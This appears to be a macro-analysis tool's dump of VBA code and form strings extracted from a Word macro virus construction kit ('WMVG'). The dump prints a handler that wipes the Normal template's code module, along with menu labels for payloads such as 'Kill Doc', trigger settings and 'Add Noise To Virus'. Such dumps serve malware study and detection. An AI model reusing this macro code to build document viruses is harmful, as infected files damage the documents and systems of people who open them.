    If OptionButton6 = True Then RandomTrigger = 40
End Sub

Private Sub OptionButton7_Click()
    If OptionButton7 = True Then RandomTrigger = 50
End Sub

Private Sub OptionButton8_Click()
    If OptionButton8 = True Then RandomTrigger = 60
End Sub

Private Sub OptionButton9_Click()
    If OptionButton9 = True Then RandomTrigger = 70
End Sub

Private Sub OptionButton10_Click()
    If OptionButton10 = True Then RandomTrigger = 80
End Sub

Private Sub OptionButton11_Click()
    If OptionButton11 = True Then RandomTrigger = 90
End Sub

Private Sub OptionButton12_Click()
    If OptionButton12 = True Then RandomTrigger = 100
End Sub



-------------------------------------------------------------------------------
VBA MACRO WMVGSecretFrm1.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGSecretFrm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub UserForm_Click()
' John Lennon Is God
WMVGSecretFrm1.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGSecretFrm2.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGSecretFrm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub UserForm_Click()
WMVGSecretFrm2.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGSecretFrm3.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGSecretFrm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub UserForm_Click()
WMVGSecretFrm3.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGSecretFrm4.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGSecretFrm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub UserForm_Click()
WMVGSecretFrm4.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGVirusCreated.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGVirusCreated'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub CommandButton1_Click()
WMVGVirusCreated.Hide
WMVGWelcome.Show
End Sub

Private Sub CommandButton2_Click()
WMVGVirusCreated.Hide
WMVGExit.Show
End Sub

Private Sub Label1_Click()
WMVGSecretFrm2.Show
End Sub

Private Sub UserForm_Click()
MsgBox "Be Carefull!", vbInformation, "WMVG"
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGWelcome.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGWelcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub UserForm_Click()
    On Error Resume Next
' Clean the Normal Template
    Clean = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If Clean > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Clean

' Hide This Form
    
    WMVGWelcome.Hide

' Launch The Kit

    WMVG.Show
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGYelloPic.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGYelloPic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub UserForm_Click()
WMVGYelloPic.Hide
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Exit�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�About
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Extras@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Generate�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Open
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Close@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i111/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 By Date
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Random
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 On Every Runer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Detail@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Detail@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i144/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Author@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Virus Name�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Commentsq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i163/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 None
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Msg Box
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 CD  Trayv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Hiccups
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Kill Docv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Assistant�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Detail@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Colours
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Detail@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Detail@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i22/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 String Type
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MShod
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MShod
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MShod
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Import/Export To A File
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i226/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MShod
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i235/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Create Source CodeL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i235/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS Co
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i235/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS Co
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i245/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Add Noise To Virus
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i245/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS Vi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i245/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS Vi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVG/i74/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Backg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Version 1.00:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Photoshop 3.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BIM'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Adobe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B#�R��3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�$r��%C4S���cs�5D'���6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tdt���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��EF��V�U(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������eu��������fv��������7GWgw��������8HXhx��������)9IYiy��������*:JZjz��������
-------------------------------------------------------------------------------
